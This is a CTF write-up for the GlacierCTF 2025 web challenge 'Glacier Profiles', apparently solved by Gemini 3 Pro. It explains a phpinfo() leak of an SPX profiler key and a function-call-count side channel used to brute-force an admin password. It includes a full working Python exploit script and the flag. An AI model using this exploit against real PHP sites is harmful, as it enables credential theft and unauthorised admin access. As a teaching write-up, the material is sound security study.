# Disclaimer
I did an experiment of trying to solve this challenge with the help of new Gemini 3 Pro model (using `gemini-cli`). **It succeeded to solve it completely on its own.**

Despite the fact, that I didn't really solve this challenge with my brain and hands, I still decided to post this writeup here to showcase the capabilities of modern LLM models in context of CTF challenges solving. That's an interesting era we live in (definitely hard for CTF creators, though :D). Aside from that, I still find challenge and solution interesting and having educational value.

# ❄️ Glacier Profiles (103 points) (48 solves)

**CTF:** GlacierCTF 2025  
**Category:** Web 
**Technique:** SPX Profiling Side-Channel

## 📝 Introduction

The challenge presents a simple "FrostFire Profiles" website where users can view avatars. There is a hidden Admin Panel protected by an RCON login code. We are provided with the source code and a Docker environment. The vulnerability stems from an exposed SPX Profiler which leaks exact function call counts, creating a reliable side-channel oracle to bruteforce the password.

## 🔍 Reconnaissance & Analysis

### 1. Exposed Developer Tool: SPX Profiler
The `Dockerfile` and `config/spx.ini` reveal that the **SPX Profiler** extension is installed and enabled. It is configured to auto-profile requests (`spx.http_profiling_auto_start=1`). 

SPX reports detailed metrics, including **function call counts**. The profiler UI is protected by a key (`spx.http_key`), but the application exposes a debug endpoint in `functions.php`:

```php
function handleDbg() {
  $action = filter_input(INPUT_POST, "action", FILTER_DEFAULT); 
  if($action !== "dbg") return;
  phpinfo();
}
```

By sending `POST action=dbg`, we can trigger `phpinfo()`, which displays all PHP configuration variables, including the secret `spx.http_key`.

### 2. Side-Channel in Password Verification
The authentication logic in `functions.php` is vulnerable:

```php
function check_password($pw, $hp) {
  if(strlen($pw) != strlen($hp)) return false;
  for($i = 0; $i < strlen($pw); $i++) {
    if(!check_char($pw[$i], $hp[$i]))
      return false;
  }
  return true;
}

function check_char($a, $b) {
  return $a == $b;
}
```

This function compares the provided password (`$hp`) with the real password (`$pw`) character by character. Crucially, `check_char` is called for every matching character plus one (the mismatch).

## 💥 The Vulnerability: Function Call Oracle

Because SPX records the **exact** number of function calls for every request, we have a noise-free side-channel:
*   **0 matches:** `check_char` called 1 time.
*   **1 match:** `check_char` called 2 times.
*   **N matches:** `check_char` called N+1 times.

By monitoring the SPX metadata endpoint for our requests, we can deduce exactly how many characters of our password guess are correct.

## ⚔️ Exploitation

### Step 1: Reconnaissance & Key Extraction
We first retrieve the SPX key by exploiting the `phpinfo()` leak.
`POST /` with `action=dbg` -> Parse response for `spx.http_key`.

### Step 2: Accessing the Side Channel
With the key, we can access the SPX metadata endpoint:
`GET /?SPX_KEY=<KEY>&SPX_UI_URI=/data/reports/metadata`
This returns a JSON list of recent requests, including a `recorded_call_count` metric for each request.

### Step 3: Bruteforcing the Password
The password length is known to be 32 (from `Dockerfile`). We iterate through each position (0 to 31):
1.  Send a login request with a candidate character.
2.  Fetch the corresponding SPX report.
3.  The character that produces the **highest function call count** is the correct one.

We repeat this process until the full password is recovered.

## 🎓 Educational Takeaways

1.  **Disable Debug Tools in Production:** Tools like SPX, Xdebug, or simply `phpinfo()` should never be accessible in a production environment. They leak configuration secrets and internal state that can be weaponized.
2.  **Side-Channels are Deterministic:** Unlike timing attacks, resource usage metrics (like instruction counts, memory allocation, or function calls) exposed by profilers or status pages provide a perfect side-channel signal.
3.  **Constant-Time Comparisons:** Sensitive string comparisons (like passwords or hashes) must be done in constant time (`hash_equals` in PHP) to prevent length and content leakage.

## 🐍 Exploit
```python
import requests
import time
import sys
import re

# Allow user to provide URL as argument, default to localhost
BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:1337"
# Ensure trailing slash
if not BASE_URL.endswith('/'):
    BASE_URL += '/'

def get_spx_key():
    print(f"[*] Fetching SPX Key from {BASE_URL}...")
    try:
        # handleDbg is triggered by action=dbg
        res = requests.post(BASE_URL, data={"action": "dbg"})

        # Look for spx.http_key in phpinfo output
        # Pattern: <tr><td class="e">spx.http_key</td><td class="v">KEY</td>
        match = re.search(r'spx\.http_key</td><td class="v">([^<]+)</td>', res.text)
        if match:
            key = match.group(1).strip()
            print(f"[+] Found SPX Key: {key}")
            return key
        else:
            print("[-] Could not find SPX Key in phpinfo output. Trying loose match...")
            # Fallback loose match
            match = re.search(r'spx\.http_key.*?<td class="v">(.*?)</td>', res.text, re.DOTALL)
            if match:
                key = match.group(1).strip()
                print(f"[+] Found SPX Key (loose match): {key}")
                return key

            print("[-] Failed to extract SPX key.")
            sys.exit(1)
    except Exception as e:
        print(f"[-] Error fetching SPX Key: {e}")
        sys.exit(1)

SPX_KEY = get_spx_key()
SPX_URL = f"{BASE_URL}index.php/?SPX_KEY={SPX_KEY}&SPX_UI_URI=/data/reports/metadata"

seen_keys = set()

def init_seen_keys():
    global seen_keys
    try:
        res = requests.get(SPX_URL)
        data = res.json()
        results = data.get('results', [])
        seen_keys = set(r['key'] for r in results)
    except:
        pass

def get_call_count(rcon_val):
    global seen_keys

    # Send request
    try:
        requests.post(BASE_URL, data={"action": "login", "rcon": rcon_val}, timeout=1)
    except:
        pass

    # Fetch metrics
    # We loop until we see a new key
    retries = 20
    while retries > 0:
        try:
            res = requests.get(SPX_URL)
            data = res.json()
            results = data.get('results', [])

            # Find new keys
            new_reports = [r for r in results if r['key'] not in seen_keys and r['http_method'] == 'POST']

            if new_reports:
                for r in new_reports:
                    seen_keys.add(r['key'])

                # Sort to ensure we get the latest if multiple appeared
                new_reports.sort(key=lambda x: x['exec_ts'], reverse=True)
                return new_reports[0]['recorded_call_count']

        except:
            pass

        time.sleep(0.05)
        retries -= 1

    return 0

def solve():
    init_seen_keys()

    length = 32
    flag = ""
    # Chars: A-Za-z0-9
    chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

    current_rcon = list("*" * length)

    print(f"[*] Starting Bruteforce (Length: {length})...")

    for i in range(length):
        best_char = None
        max_count = -1

        for c in chars:
            current_rcon[i] = c
            payload = "".join(current_rcon)
            cnt = get_call_count(payload)

            if cnt > max_count:
                max_count = cnt
                best_char = c

        if best_char:
            flag += best_char
            current_rcon[i] = best_char
            print(f"\r[+] Found char {i+1}/{length}: {best_char} (Count: {max_count}) | Partial: {flag}", end="")
        else:
            print(f"\n[-] Failed to find char at index {i}")
            break

    print(f"\n[+] RCON Password: {flag}")

    verify_login(flag)

def verify_login(flag):
    print("[*] Verifying login...")
    s = requests.Session()
    res = s.post(BASE_URL, data={"action": "login", "rcon": flag})
    if "Logout" in res.text:
        print("[+] Login Successful!")
        match = re.search(r'(gctf{.*?})', res.text)
        if match:
             print(f"[+] FLAG: {match.group(1)}")
        else:
             # Just print the admin section content
             start = res.text.find("Admin Panel")
             end = res.text.find("Logout")
             if start != -1 and end != -1:
                 print(f"[+] Admin Section Content: {res.text[start:end]}")
             else:
                 print(res.text)
    else:
        print("[-] Login Failed.")

if __name__ == "__main__":
    solve()

```

## 🚩 Flag
`gctf{Y0u_C4n_Als0_S!d3Ch4nN3l_PhP_O_o_axNGgpno5ycGw85}`
